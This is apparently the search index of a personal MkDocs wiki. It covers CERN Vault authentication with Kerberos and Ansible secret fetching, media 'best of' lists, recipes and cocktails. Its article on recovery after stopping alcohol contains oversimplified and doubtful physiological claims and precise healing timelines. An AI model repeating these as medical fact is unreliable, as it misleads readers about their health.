[https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo](https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo)\n</code></pre> Bash<pre><code>sudo yum -y install vault\n</code></pre> <p>NOTE: this install method is temporary and should be done manually until we decide to have Vault in internal repos. You could also use the rpm on NFS at <code>/nfs/cs-ccr-nfshome/user/kturvas/starnet/vault-1.10.2-1.x86_64.rpm</code></p>"},{"location":"content/devops/vaultkrb/#cern-ad-host-usage","title":"CERN AD host usage","text":"<p>Your host must be part of Computers by OS Unknown group for the following to work since VMs used for testing were only in one group, Computers by OS Unknown, at the time of writing. Of course, the potential of dividing hosts in different e-groups in the future allows for more versatility.</p>"},{"location":"content/devops/vaultkrb/#manual-host-usage","title":"Manual host usage","text":"<p>If you do not wish to add Vault to your host's ansible workflow or would just like to observe how it works in principal.</p> <p>Create the temporary second Kerberos configuration for Vault using <code>krb5.conf</code> as Vault identifies 4 lines of CERN krb5 conf as part of krb4 which it deems incompatible:</p> <p>Duplicate Kerberos configuration:</p> Bash<pre><code>cp /etc/krb5.conf /etc/krb5.conf.nov4\n</code></pre> <p>Remove incompatible Kerberos v4 lines (the following command finds the line <code>v4_name_convert</code> and deletes it + 4 lines after it in a file):</p> Bash<pre><code>sed -i \"$(grep -n v4_name_convert /etc/krb5.conf.nov4 | cut -d : -f1),$(expr $(grep -n v4_name_convert /etc/krb5.conf.nov4 | cut -d : -f1) + 4)d\" /etc/krb5.conf.nov4\n</code></pre> <p>Authenticate to Vault as root using the host keytab:</p> Bash<pre><code>vault login -method=kerberos \\\n  username=host/\"$(hostname)\" \\\n  service=host/vault.cern.ch \\\n  realm=CERN.CH \\\n  keytab_path=/etc/krb5.keytab \\\n  krb5conf_path=/etc/krb5.conf.nov4 \\\n  disable_fast_negotiation=true\n</code></pre> <p>Now, if your host is also part of Computers by OS Unknown you will be able to read (not write or update) secrets under the path <code>kv/acc-adm/compos</code></p> <p>Authenticate as a user part of <code>acc-adm-support</code> to create secrets under that path for hosts to be able to read and fetch them.</p>"},{"location":"content/devops/vaultkrb/#ansible-host-usage","title":"Ansible host usage","text":"<p>It is advisable to organise tasks that use Vault in a manner where they are skipped if no connection to Vault is present. This allows using Vault in a very non-intrusive way where all previous workflows will not be affected in case of errors.</p> <p>Create the temporary second Kerberos configuration for Vault using <code>krb5.conf</code> as Vault identifies 4 lines of CERN krb5 conf as part of krb4 which it deems incompatible:</p> Text Only<pre><code>- name: Check if Vault nov4 Kerberos conf exists\n  stat:\n    path: /etc/krb5.conf.nov4\n  register: nov4\n\n- name: Create nov4 Kerberos conf\n  shell: |\n    cp /etc/krb5.conf /etc/krb5.conf.nov4\n    sed -i \"$(grep -n v4_name_convert /etc/krb5.conf.nov4 | cut -d : -f1),$(expr $(grep -n v4_name_convert /etc/krb5.conf.nov4 | cut -d : -f1) + 4)d\" /etc/krb5.conf.nov4\n  when: not nov4.stat.exists\n</code></pre> <p>For example create a task that checks Vault port and registers the result:</p> Text Only<pre><code>- name: Verify port 8200 is listening on vault.cern.ch\n  wait_for:\n    host: vault.cern.ch\n    port: 8200\n    timeout: 1\n    register: vault_reachable\n  ignore_errors: yes\n</code></pre> <p>Then add a check to all tasks that use Vault:</p> Text Only<pre><code>when: not vault_reachable.failed\n</code></pre> <p>Authenticating and getting a non-renewable token:</p> Text Only<pre><code>- name: Authenticate to Vault to get a fresh token\n  shell: |\n    export VAULT_ADDR='{{ vault_addr }}'\n    vault login -address=\"{{ vault_addr }}\" -method=kerberos \\\n    username=host/\"$(hostname)\" \\\n    service=host/vault.cern.ch \\\n    realm=CERN.CH \\\n    keytab_path=/etc/krb5.keytab \\\n    krb5conf_path=/etc/krb5.conf.nov4 \\\n    disable_fast_negotiation=true\n  when: not vault_reachable.failed\n</code></pre> <p>Example of fetching and using secrets (inserting secrets into applications using <code>sed</code>):</p> Text Only<pre><code>- name: Set the broker.json pass\n  shell: |\n    export BROKER_PASS=$(vault kv get -address='{{ vault_addr }}' -field=\"{{ fastx_config.broker_pass_var }}\" kv/acc-adm/compos/rog)\n    sed -i \"s/brokerPass/${BROKER_PASS}/\" /etc/fastx/broker.json\n    sed -i \"s/^requirepass.*/requirepass ${BROKER_PASS}/g\" /etc/redis/redis.conf\n  when: not vault_reachable.failed\n</code></pre>"},{"location":"content/devops/vaultkrb/#web-ui","title":"Web UI","text":""},{"location":"content/devops/vaultkrb/#cern-ad-user-usage_1","title":"CERN AD user usage","text":"<p>NOTE: following requires that you are part of the acc-adm-support e-group!</p> <p>Navigate to https://vault.cern.ch:8200 and login using LDAP method with your CERN credentials:</p> <p></p> <p>Click on <code>kv/</code> secrets engine:</p> <p></p>"},{"location":"content/devops/vaultkrb/#personal-secrets_1","title":"Personal secrets","text":"<p>Personal secrets path is a path that only one account has access to, the path where you create secrets that are specific to your use cases.</p> <p>Click on the <code>personal/</code> path:</p> <p></p> <p>Click on \"Create secret\":</p> <p></p> <p>Set key/value secrets under your personal user secrets path:</p> <p></p> <p>Now you should be able to see the new secret you created:</p> <p></p>"},{"location":"content/devops/vaultkrb/#inbox-secrets_1","title":"Inbox secrets","text":"<p>Inbox secrets is a path template that allows sharing secrets with one account. Under every personal secret path there is a special sub path called inbox where other users have read/write access to (this is the only path in the personal secrets path where others have read/write access to). That path is <code>personal/&lt;USERNAME&gt;/inbox/from-&lt;ANY OTHER USERNAME&gt;/*</code></p> <p>Create a new secret under someone elses inbox:</p> <p></p> <p>Note that you only have access to other people's personal secrets path if it is under the inbox paths <code>kv/personal/*/from-\"$USER\"</code> and <code>kv/personal/*/\"$USER\"</code>:</p> <p></p>"},{"location":"content/devops/vaultkrb/#general-secrets_1","title":"General secrets","text":"<p>General secrets correspond to some policy that allows reading/writing secrets shared by a group of users (like users of an e-group/LDAP group). The following requires that you are part of the <code>acc-adm-support</code> e-group for example.</p> <p>Using what you've learned in the previous steps, try creating a secret under the path <code>kv/acc-adm</code> and then try fetching it or use the web UI to see what secrets others have created under <code>kv/acc-adm</code>.</p>"},{"location":"content/extras/","title":"Extras","text":"<p>Site Sources</p> <p>Created with Mkdocs</p> <p>Beautified with Material</p> <p>Hosted on GitHub Pages</p> <p>Not sure what else to put here, but for making it here, you shall be rewarded with a story I found on Reddit:</p> <p>People: \"We must consult the technopriests about how to do the thing!\"</p> <p>People to technopriests: \"Oh venerated guardians of the ancient wisdom of the all-knowing Search Engine, we come to you for advice on how to do the thing! As a token of our appreciation for your utterly obfuscated divine art, we bring you a cup of coffee, so that you may perform your ceremonies without falling asleep\"</p> <p>Technopriests to people: \"Your offering is acceptable. We shall feast on it and then consult with the mighty ancient Search Engine on how to do the thing!\"</p> <p>The technopriests ingest the liquid and walk down into the basement of ancient wisdom and knowledge. A small box sits there, with status light glowing and fading, as if breathing.</p> <p>Technopriests: \"O mighty Godgle, how do we do the thing?\"</p> <p>Godgle, the box of all knowledge: \"You do the thing by doing it, not by not doing it\"</p> <p>Technopriests: \"We thank you for this wisdom oh mighty Godgle\"</p> <p>The technopriests resurface.</p> <p>Technopriests to people: \"We have received divine wisdom from the mighty Search Engine and it has told us that you may do the thing by doing it instead of not doing it!\"</p> <p>People: \"Truly, we could never have figured this out ourselves\"</p> <p>And so the people did the thing instead of not doing the thing and humanity was saved once more.</p> <p></p>"},{"location":"content/extras/bestof/","title":"Best Of","text":"<p>A collection of lists of what I believe to be the best of the best from each medium. The lists are in alphabetical order. Items marked with an asterisk <code>*</code> are considered 10/10.</p>"},{"location":"content/extras/bestof/#movies","title":"Movies","text":"<ul> <li>A Star Is Born</li> <li>Amelie</li> <li>American Beauty</li> <li>Apocalypse Now</li> <li>Barbie</li> <li>Beau Is Afraid</li> <li>Before Sunrise</li> <li>Birdman</li> <li>Black Mirror: Bandersnatch</li> <li>Bladerunner 2049</li> <li>Borat</li> <li>Challengers</li> <li>Django Unchained</li> <li>Dune</li> <li>Eternal Sunshine of the Spotless Mind</li> <li>Everybody Wants Some</li> <li>Fight Club</li> <li>Force\u00a0Majeure</li> <li>Fred J\u00fcssi. The Beauty of Being</li> <li>Gone Girl</li> <li>Grand Budapest Hotel</li> <li>Gravity</li> <li>Harakiri</li> <li>Her</li> <li>Hoodwinked</li> <li>Inglourious Basterds</li> <li>Interstellar <code>*</code></li> <li>Isle Of Dogs</li> <li>Jojo Rabbit</li> <li>Kill Bill</li> <li>Kung Fu Panda</li> <li>La La Land</li> <li>Lock Stock And Two Smoking Barrels</li> <li>Lost In Translation</li> <li>Mad Max Fury Road</li> <li>Memento</li> <li>Moonrise Kingdom</li> <li>Nightcrawler</li> <li>No Country For Old Men</li> <li>Parasite</li> <li>Perfect Days</li> <li>Ratatouille</li> <li>Rolling Papers</li> <li>Scott Pilgrim vs The World</li> <li>Seven Samurai</li> <li>Sin City</li> <li>Spider-Man: Across the Spider-Verse</li> <li>Star Wars</li> <li>Tampopo</li> <li>The French Dispatch</li> <li>The Menu <code>*</code></li> <li>The Prestige</li> <li>The Revenant</li> <li>The Shawshank Redemption</li> <li>Trainspotting</li> <li>Whiplash</li> </ul>"},{"location":"content/extras/bestof/#series","title":"Series","text":"<ul> <li>Adventure Time</li> <li>Andor</li> <li>Arcane</li> <li>Better Call Saul</li> <li>Breaking Bad</li> <li>Maniac</li> <li>Planet Earth</li> <li>Sense8</li> <li>SpongeBob SquarePants</li> <li>The Bear (especially S02E07)</li> <li>The Office</li> <li>Twin Peaks</li> <li><code>*</code> Mad Men</li> </ul>"},{"location":"content/extras/bestof/#anime","title":"Anime","text":"<ul> <li>Bakemonogatari</li> <li>Berserk</li> <li>Cyberpunk Edgerunners</li> <li>Dragon Dentist</li> <li>FLCL</li> <li>Ghost In The Shell</li> <li>Gurren Lagann</li> <li>Haikyuu</li> <li>JoJo's Bizarre Adventure</li> <li>Kaguya-sama: Love Is War</li> <li>Kill La Kill</li> <li>Kino's Journey</li> <li>Legend Of The Galactic Heroes</li> <li>Made In Abyss</li> <li>March Comes Like A Lion</li> <li>Penguindrum</li> <li>Revolutionary Girl Utena</li> <li>Serial Experiments Lain</li> <li>Skip to Loafer</li> <li>Sonny Boy</li> <li>Your Lie In April</li> <li>Your Name</li> <li>Neon Genesis Evangelion <code>*</code></li> <li>Whisper of the Heart <code>*</code></li> </ul>"},{"location":"content/extras/bestof/#theatre","title":"Theatre","text":"<ul> <li>Iraani konverents - Lembit Peterson (autor: Ivan V\u00f5r\u00f5pajev)</li> <li>Kaitseala - Jan Teevet</li> <li>Kom\u00f6\u00f6dia by Mart Kangro</li> <li>Lab\u00fcrint - Jan Teevet</li> <li>Liblikap\u00fc\u00fcdja - Kersti Heinloo (autor: John Fowles)</li> <li>Metazoa - Markus H. Ilves</li> <li>Tangent by Shiro Takatani/Dumb Type</li> <li>\u00dcLT by Renate Keerd</li> <li>Eidos by Jarmo Reha <code>*</code></li> <li>P\u00e4va l\u00f5puks, kiigu by Renate Keerd &amp; EMTA XXXI lend <code>*</code></li> <li>Planet Alexithymia by Karl Saks <code>*</code></li> <li>Jussikese 7 s\u00f5pra by Kristina Preimann, Kristel Zimmer, Edgar Vun\u0161, Markus Auling, Herman PihlakKarl Birnbaum</li> </ul>"},{"location":"content/extras/bestof/#exhibitions","title":"Exhibitions","text":"<ul> <li>Ryoji Ikeda in Amos Rex (Winter 2023/2024)</li> <li>Tampere Moomin Museum (Summer 2023)</li> </ul>"},{"location":"content/extras/bestof/#books","title":"Books","text":"<ul> <li>Brave New World</li> <li>Breakfast of Champions</li> <li>Kafka on the Shore</li> <li>Man's Search for Meaning</li> <li>Mees, kes teadis ussis\u00f5nu</li> <li>Milk and Honey</li> <li>Mort</li> <li>Never Split the Difference</li> <li>The Passion</li> <li>What I Talk About When I Talk About Running</li> <li>God Emperor of Dune <code>*</code></li> <li>The Power of Now <code>*</code></li> <li>Terry Pratchett's Discworld</li> </ul>"},{"location":"content/extras/bestof/#games","title":"Games","text":""},{"location":"content/extras/bestof/#singleplayer","title":"Singleplayer","text":"<ul> <li>Beat Saber</li> <li>Borderlands 2</li> <li>Cruelty Squad</li> <li>Cyberpunk 2077</li> <li>DayZ</li> <li>Dead Space</li> <li>Death Stranding</li> <li>Deus Ex</li> <li>Dishonored</li> <li>E.Y.E: Divine Cybermancy</li> <li>Factorio</li> <li>Fallout 3</li> <li>Fallout: New Vegas</li> <li>FTL: Faster Than Light</li> <li>Getting Over It with Bennett Foddy</li> <li>Grand Theft Auto IV</li> <li>Grand Theft Auto: San Andreas</li> <li>Half-Life 2</li> <li>Half-Life: Alyx</li> <li>Half-Life</li> <li>Hotline Miami</li> <li>Infinifactory</li> <li>Inscryption</li> <li>Life Is Strange</li> <li>Metal Gear Rising: Revengeance</li> <li>Metal Gear Solid 3: Snake Eater</li> <li>Minecraft</li> <li>Mirror's Edge</li> <li>Need for Speed: Most Wanted</li> <li>Need for Speed: ProStreet</li> <li>Need for Speed: Underground 2</li> <li>NieR: Automata</li> <li>osu!</li> <li>Outer Wilds</li> <li>Persona 4 Golden</li> <li>Portal 2</li> <li>Portal</li> <li>Prey</li> <li>Shadowrun: Hong Kong</li> <li>Terraria</li> <li>The Binding of Isaac: Rebirth</li> <li>The Red Strings Club</li> <li>Undertale</li> <li>Yakuza 0</li> </ul>"},{"location":"content/extras/bestof/#multiplayer","title":"Multiplayer","text":"<ul> <li>Battlefield 3</li> <li>Battlefield 4</li> <li>Counter-Strike: Global Offensive</li> <li>Deep Rock Galactic</li> <li>Garry's Mod</li> <li>Grand Theft Auto V</li> <li>It Takes Two</li> <li>Killing Floor</li> <li>Need for Speed: Hot Pursuit</li> <li>Rainbow Six: Siege</li> <li>Rust</li> <li>Team Fortress 2</li> <li>Titanfall 2</li> <li>Titanfall</li> <li>VRChat</li> </ul>"},{"location":"content/extras/recs/","title":"Recommendations","text":"<p>A collection of recommendation lists.</p>"},{"location":"content/extras/recs/#estonian-movies","title":"Estonian movies","text":"<ul> <li>1944</li> <li>Cherry Tobaco</li> <li>Love is Blind</li> <li>Names in Marble</li> <li>Tangerines</li> <li>The Adventurer</li> <li>The Dissidents</li> <li>The Fencer</li> <li>The Little Comrade</li> <li>The Old Man Movie</li> <li>The Polar Boy</li> <li>Truth and Justice</li> </ul>"},{"location":"content/food/","title":"Food","text":"<p>Anything related to food, cooking and recipes is documented in this section.</p>"},{"location":"content/food/#interesting-recipes","title":"Interesting Recipes","text":"<ul> <li>Edible balloon recipe</li> </ul>"},{"location":"content/food/#cooking-bibles","title":"Cooking Bibles","text":"<p>Reading these two is all one needs to become a better than average cook:</p> <ul> <li>Salt, Fat, Acid, Heat - Samin Nosrat</li> <li>No-Recipe Recipes - Sam Sifton</li> </ul>"},{"location":"content/food/#related-links","title":"Related links","text":"<ul> <li>Hacks, Tips, and \"Takes\" on Food &amp; Cooking</li> <li>How to Make the Best Wings at Home</li> <li>How to Plate Food at Home</li> <li>Learn How To Cook in Under 25 Minutes - Joshua Weissman</li> <li>Real Fast Food - Nigel Slater</li> <li>The Sad Bastard Cookbook - Rachel A. Rosen and Zilla Novikov</li> <li>What Cooking is Like for Someone Who Doesn't Cook</li> <li>What Does \"Medium Heat\" Even Mean?? - Internet Shaquille</li> </ul>"},{"location":"content/food/#favourite-authors","title":"Favourite authors","text":"<ul> <li>Babish Culinary Universe</li> <li>Food Wishes</li> <li>Gordon Ramsay</li> <li>Internet Shaquille</li> <li>Just One Cookbook</li> <li>Pro Home Cooks</li> <li>serious eats</li> <li>You Suck At Cooking</li> </ul>"},{"location":"content/food/basics/","title":"Basics","text":"<p>Collection of basic cooking techniques and instructions.</p>"},{"location":"content/food/basics/#cooking-eggs","title":"Cooking eggs","text":""},{"location":"content/food/basics/#boiling-timings","title":"Boiling timings","text":"<ul> <li>Soft and runny - 7min</li> <li>Soft but jammy - 8min</li> <li>Cooked but soft center - 10min</li> <li>Hardboiled - 12-13min</li> </ul>"},{"location":"content/food/basics/#cooking-rice","title":"Cooking rice","text":"<p>Wash the rice until water runs clear to get rid of starch and facilitate maximum fluffiness. Then add water according to ratios:</p> <p>Rice to water ratios:</p> <ul> <li>Long-grain white rice - 1:2</li> <li>Short-grain white rice - 1:1.25</li> <li>Brown rice - 1:1.75</li> </ul> <p>Season only with salt. Immediately after bringing the water to a boil, reduce to simmer. Stir once and keep under a lid to steam the rice according to timings:</p> <p>Timings:</p> <ul> <li>Long-grain white rice - 18min</li> <li>Short-grain white rice - 15min</li> <li>Brown rice - 45min</li> </ul> <p>Bring off heat and let steam for another 10min without moving the lid. Then season with rice vinegar, butter, herbes according to taste.</p>"},{"location":"content/food/body-when-you-stop-drinking-alcohol/","title":"What Happens When You Stop Consuming Alcohol","text":"<p>The molecule ethanol is what makes you feel drunk. It does this by binding to receptors in your brain. Most notably ethanol binds to glutamate neurotransmitters, which in turn causes the brain to respond slower to stimuli. Along with glutamate neurotransmitters there are several other receptors that ethanol binds with that slows brain function. The result of these inhibited receptors is what we call drunkenness. The reversal of this process can take a while, and the hangover that ensues after a heavy night of drinking is a mix of your body trying to get rid of the ethanol and other harmful molecules, along with dehydration. Unfortunately, if enough ethanol builds up in your system, it can kill you. To be clear, most doctors and scientists agree that occasionally drinking alcohol poses very minimal health risks. In fact, consuming alcohol in moderation may have some health benefits. However, health problems arise when overconsumption occurs.</p>"},{"location":"content/food/body-when-you-stop-drinking-alcohol/#recovery-timeline-from-alcohol","title":"Recovery timeline from alcohol","text":"<ol> <li> <p>Seconds after - you stop drinking, your liver slowly filters out the toxins and sugars found in the alcohol.</p> </li> <li> <p>An hour - your body has filtered your blood several times and metabolized the drinks you\u2019ve had and your body starts to feel tired due to the high amount of energy it uses to remove the alcohol from your blood. The time it takes your body to break down the alcohol directly correlates to the amount consumed.</p> </li> <li> <p>Six hours - time for your body to completely break down all the ethanol in your system and bring the sugar, water, and other nutrient levels back to normal, the lingering effects of drunkenness will persist. After you\u2019ve had your last sip of alcohol your body needs more rest than usual to recover from your attempts to poison it. Unfortunately, until you get past this stage, it is difficult to have a good night\u2019s sleep. In fact, recent research suggests that alcohol actually increases alpha wave patterns in the brain, which are only supposed to be present while you\u2019re awake. This implies that alcohol tricks the brain into thinking the body is awake when it is really trying to sleep.</p> </li> <li> <p>6 to 12 hours - your body physically starts to change for the better. For one thing, alcohol has been shown to weaken your immune system. This may leave you susceptible to viruses and bacteria that are present at bars and parties.</p> </li> <li> <p>24 hours - your immune system returns to normal.</p> </li> <li> <p>3 to 5 days - you may find that your blood pressure begins to drop and you will overall feel less stressed. Doctors often recommend that people with high blood pressure reduce the amount of alcohol they consume, so even if this is not your goal, less than a week after you stop drinking your body will be grateful for the much needed break. You might also notice your appetite begins to decrease about a week after you stop consuming alcohol. This is one of the reasons that people tend to lose weight when they quit drinking. The other reason is that on average each drink you\u2019re consuming contains a couple of hundred calories. And since the sugars in alcohol don't break down in your body very well, much of it gets stored as fat. If you can give up drinking for an entire week you may also find your skin looks and feels better. This is because your body is now more hydrated. Not only does alcohol make you pee more often, but it also decreases your antidiuretic hormone levels, which play a role in allowing your body to reabsorb water.</p> </li> <li> <p>7 days - hormone levels are back to normal and your body is retaining more water. This is good not only for your skin but for your body overall.</p> </li> <li> <p>2 weeks - without alcohol you may find your cognitive abilities start to improve and without the pressure of filtering alcohol, your kidneys will begin to repair themselves. This is because the brain, like many parts of your body, is resilient. The damage done to your neural pathway by the ethanol can be reversed. You will never regain memories from when you blacked out while drinking or recover thoughts that were obliterated from overconsumption of alcohol, but many of your neural connections will heal themselves over the coming weeks and months. Like the liver, the kidneys filter out toxins. They are not quite as affected by alcohol as the liver is, but overconsumption can definitely cause damage over time. After a couple of weeks of no drinking, the kidneys will heal enough to maintain proper fluid levels, waste excretion, and hormone balances.</p> </li> <li> <p>3 weeks to a month - the liver will repair itself and tissue will start to regenerate fully. The organ that takes the brunt of the damage when you drink is the liver. It is a vital structure and without it, you can\u2019t survive. Without having to worry about alcohol, your liver can focus on breaking down other toxins that are produced by the body, which overall will make you feel healthier.</p> </li> <li> <p>1 to 2 months - your liver will be working at full power again. Just reducing the amount of alcohol you consume on a weekly basis can be beneficial for your liver. Too much drinking can also damage your heart and increase your chances of having a heart attack or a stroke. Around two months after you stop drinking your heart will have repaired most of the damage caused by overconsumption of alcohol.</p> </li> <li> <p>More than 2 months - your body may feel a better in a multitude of ways due to a combination of less stress and allowing your organs to repair themselves. Interestingly, stress has very similar effects on the body as alcohol does. It can increase blood pressure, cause heart problems, negatively affect your skin, and cause depression. One of the most surprising changes to your body after you stop drinking happens without you even feeling anything. The research suggests that people who consume large amounts of alcohol are at higher risk for certain types of cancer, which makes sense when you think about it. Since your body technically sees alcohol as a toxin, and your liver is responsible for removing that toxin, it is no surprise that people who are heavy drinkers have a high risk of developing liver cancer. This means that once you stop drinking, you are actually lowering the chances of your body developing cancer.</p> </li> </ol>"},{"location":"content/food/body-when-you-stop-drinking-alcohol/#sources","title":"Sources","text":"<ul> <li>https://www.webmd.com/mental-health/addiction/ss/slideshow-quit-alcohol-effects</li> <li>https://www.healthline.com/health-news/what-happens-to-your-body-when-you-quit-alcohol-for-30-days</li> <li>https://www.menshealth.com/health/a19532341/what-happens-when-you-stop-drinking-alcohol/</li> <li>https://www.euro.who.int/en/health-topics/disease-prevention/alcohol-use/news/news/2020/04/alcohol-does-not-protect-against-covid-19-access-should-be-restricted-during-lockdown#:~:text=Alcohol%20consumption%20is%20associated%20with,COVID%2D19%20pandemic.</li> <li>https://health.howstuffworks.com/wellness/drugs-alcohol/how-alcohol-makes-drunk.htm</li> <li>https://health.clevelandclinic.org/how-alcohol-affects-your-kidney-health/</li> </ul>"},{"location":"content/food/desserts/","title":"Desserts","text":"<p>Collection of dessert recipes.</p>"},{"location":"content/food/desserts/#curd-dessert-with-roasted-oatmeal","title":"Curd Dessert with Roasted Oatmeal","text":"<p>Ingredients</p> <ul> <li>200 ml heavy cream</li> <li>3 tbsp sugar</li> <li>1 tsp vanilla sugar</li> <li>400 g curd paste (kohupiimapasta)</li> <li>3 tbsp roasted barley flour (kama)</li> <li>1 tsp freshly squeezed lemon juice</li> </ul> <p>Creamy Cottage Cheese Dessert Instructions:</p> <ol> <li>Whip the heavy cream with sugar and vanilla sugar</li> <li>Mix in the curd paste and roasted barley flour (kama) gradually while stirring</li> <li>Sprinkle some lemon juice over the barley mixture for enhanced flavor</li> <li>Divide the mixture into serving dishes and serve</li> </ol> <p>Roasted Oatmeal Ingredients</p> <ul> <li>100 g oatmeal</li> <li>1-2 tbsp butter</li> <li>1-2 tbsp sugar</li> </ul> <p>Roasted Oatmeal Instructions:</p> <ol> <li>Heat a pan over medium heat, add rolled oats and butter, and toast for about 5 minutes, stirring constantly, until the oats turn golden brown. Stir in sugar and cook for a few more minutes. Remove the pan from heat and let it cool.</li> </ol>"},{"location":"content/food/drinks/","title":"Drinks","text":"<p>Collection of my favorite drinks.</p>"},{"location":"content/food/drinks/#coffee","title":"Coffee","text":"<p>Espresso tonic:</p> <ul> <li>Espresso</li> <li>Tonic Water</li> <li>Blueberry Simple Syrup</li> <li>Ice</li> </ul>"},{"location":"content/food/drinks/#wine","title":"Wine","text":""},{"location":"content/food/drinks/#red-wine","title":"Red wine","text":"<ul> <li>Paul Mas - Ch\u00e2teau Paul Mas Coteaux du Languedoc Clos des Mures</li> <li>Morgon</li> <li>Brouilly</li> <li>The Wanted - Zinfandel Old Vines</li> <li>Zonin - Primitivo di Manduria</li> <li>Piccini Chianti</li> <li>Meerlust - Rubicon</li> <li>Coto de Imaz Rioja Reserva</li> </ul>"},{"location":"content/food/drinks/#white-wine","title":"White wine","text":"<ul> <li>Bernard Gripa - Saint-Joseph</li> <li>Cielo e Terra - 3 Passo Bianco</li> <li>Chardonnay</li> <li>Sauvignon blanc</li> <li>Chablis</li> <li>Pinot Grigio - Terre Collina</li> <li>Pinot Grigio - Masi Masianco</li> <li>Pinot Grigio - Jacob's Creek 2021</li> </ul>"},{"location":"content/food/drinks/#cider","title":"Cider","text":"<ul> <li>Galipette Brut</li> </ul>"},{"location":"content/food/drinks/#whisky","title":"Whisky","text":"<ul> <li>Laphroaig Four Oak</li> </ul>"},{"location":"content/food/drinks/#liquer","title":"Liquer","text":"<ul> <li>Jack Daniel's Tennessee Honey</li> <li>Koskenkorva Espresso</li> </ul>"},{"location":"content/food/drinks/#rum","title":"Rum","text":"<ul> <li>Bumbu The Original</li> </ul>"},{"location":"content/food/drinks/#gin","title":"Gin","text":"<ul> <li>Gin del Sospiri - Gin Veneziano</li> </ul>"},{"location":"content/food/drinks/#cocktails","title":"Cocktails","text":""},{"location":"content/food/drinks/#the-one-bottle-bar-aka-spritz-cocktails","title":"The \"one bottle bar\" aka spritz cocktails","text":"<p>Aperol Spritz:</p> <ul> <li>3 parts Prosecco</li> <li>2 parts Aperol</li> <li>1 part Club soda</li> </ul> <p>Spaghett:</p> <ul> <li>1 light beer (sipped down to 10 total oz)</li> <li>1\u00bd oz (45ml) Aperol</li> <li>\u00bd oz (15ml) lemon juice</li> </ul> <p>Hey Mambo:</p> <ul> <li>1 oz (30ml) Aperol</li> <li>\u00bd oz (15ml) Mezcal</li> <li>\u00bd oz (15ml) Blanco Tequila</li> <li>1\u00bd oz (45ml) Pineapple Juice</li> <li>1\u00bd oz (45ml) Coconut Cream</li> <li>\u00bd oz (15ml) Lime Juice</li> </ul> <p>Paper Plane:</p> <ul> <li>\u00be oz (20ml) bourbon</li> <li>\u00be oz (20ml) Aperol</li> <li>\u00be oz (20ml) Amaro Nonino</li> <li>\u00be oz (20ml) lemon juice</li> </ul>"},{"location":"content/food/drinks/#sit-in-front-of-a-fireplace-with-a-book-cocktails","title":"\"Sit in front of a fireplace with a book\" cocktails","text":"<p>Old Fashioned:</p> <ul> <li>2oz (60ml) Bourbon</li> <li>4 Dashes Angostura Bitters</li> <li>1 Sugar Cube</li> <li>Dash Soda Water</li> <li>Lemon and Orange Twist</li> </ul>"},{"location":"content/food/drinks/#rainy-blanket-burrito-cold-day-cocktails","title":"Rainy, blanket burrito, cold day cocktails","text":"<p>Irish Coffee:</p> <ul> <li>3oz (90ml) Coffee</li> <li>1 barspoon brown sugar</li> <li>1 barspoon cane sugar</li> <li>1.5oz (45 ml) Irish Whiskey</li> <li>Dry shake some heavy cream to top</li> </ul> <p>Dead Rabbit Irish Coffee | How to Drink's version:</p> <ul> <li>1 oz. or 30 ml. Bushmill's Irish Whiskey</li> <li>~.5 oz. or 15 ml. Simple Syrup</li> <li>3.5 oz. or 105 ml. Hot Coffee</li> <li>Top with fresh whipped cream</li> <li>garnish with grated nutmeg</li> </ul>"},{"location":"content/food/drinks/#caffeinated-sweet-flow","title":"Caffeinated sweet flow","text":"<p>Espresso Martini:</p> <ul> <li>Build in Shaker</li> <li>.75 oz. or 22 ml. Kahlua</li> <li>.75 oz. or 22 ml. Vodka</li> <li>1 oz. or 30 ml. Cold Brew Coffee</li> <li>Lemon peel in the shaker</li> <li>Add ice and shake</li> <li>Strain into glass</li> <li>Garnish with 3 coffee beans</li> </ul> <p>The First Lady:</p> <ul> <li>Build in in Shaker</li> <li>.5 oz. or 15 ml. Lemon juice</li> <li>.5 oz. or 15 ml. Simple syrup</li> <li>.5 oz. 15 ml. Cointreau</li> <li>1.5 oz. or 45 ml. Gin</li> <li>1 bar spoon matcha</li> <li>Fresh Basil leaf</li> <li>1 egg white</li> <li>Dry shake</li> <li>Add ice and shake again</li> <li>Double strain into glass</li> <li>Garnish with basil leaf</li> </ul>"},{"location":"content/food/drinks/#summer-palm-trees-and-beach-vibes","title":"Summer, palm trees and beach vibes","text":"<p>Kitty Highball:</p> <ul> <li>2oz (60ml) Red Wine</li> <li>.75oz (22.5ml) Ginger Syrup</li> <li>.5oz (15ml) Lime Juice</li> <li>Top Soda Water or Ginger Beer</li> </ul>"},{"location":"content/food/maincourses/","title":"Main Courses","text":"<p>Collection of main courses.</p>"},{"location":"content/food/maincourses/#blue-cheese-chicken-pie","title":"Blue Cheese Chicken Pie","text":"<p>Crust Ingredients</p> <ul> <li>360g unsalted butter</li> <li>650g flour</li> <li>200g grated neutral young cheddar</li> <li>1 tsp salt</li> <li>a little less than 1 cup of water</li> </ul> <p>Crust Instructions:</p> <ol> <li>Pinch the butter, flour and salt into soft but slightly crumbling mass.</li> <li>Add water and combine evenly. It shouldn't bee crumbling but also not too wet.</li> <li>Push the dough onto the sides and bottom of the baking tray.</li> <li>Poke some holes sparsely (about every 5cm) into the crust with a fork.</li> <li>Keep cold until the filling is ready.</li> <li>When the filling is ready, put the crust into the oven at 185\u00b0C (Tammet\u00f5ru 200\u00b0C) for 10 minutes.</li> </ol> <p>Filling Ingredients</p> <ul> <li>600g marinated broiler fillet</li> <li>2 yellow onions</li> <li>2 red paprika peppers</li> <li>200-300g drained pineapple pieces</li> <li>200g Royal Blue blue cheese (or other not too neutral)</li> <li>400g whipping cream</li> <li>2 eggs</li> <li>400g grated neutral young cheddar</li> </ul> <p>Filling Instructions:</p> <ol> <li>Cut broiler fillet into small pieces and sautee until half of the moisture has evaporated.</li> <li>Add finely diced onions and red peppers and continue sauteeing for 5 minutes.</li> <li>Move everything from the pan to a big bowl and mix with diced pineapple and blue cheese.</li> <li>Mix whipping cream with eggs and add everything into the bowl.</li> <li>Once the crust has been cooked for 10 minutes, add the filling into the crust and cook for another 20 minutes or until golden brown at 185\u00b0C (Tammet\u00f5ru 200\u00b0C).</li> </ol>"},{"location":"content/food/maincourses/#bolognese","title":"Bolognese","text":"<p>Ingredients</p> <ul> <li>1 tbsp unsalted butter</li> <li>50g ham</li> <li>2 yellow onions</li> <li>1 clove of garlic</li> <li>1 carrot</li> <li>100ml red wine</li> <li>400g minced beef</li> <li>100ml chicken stock</li> <li>400g tomate paste (Pomi passata di pomodoro is best)</li> <li>1 tsp oregano</li> <li>some 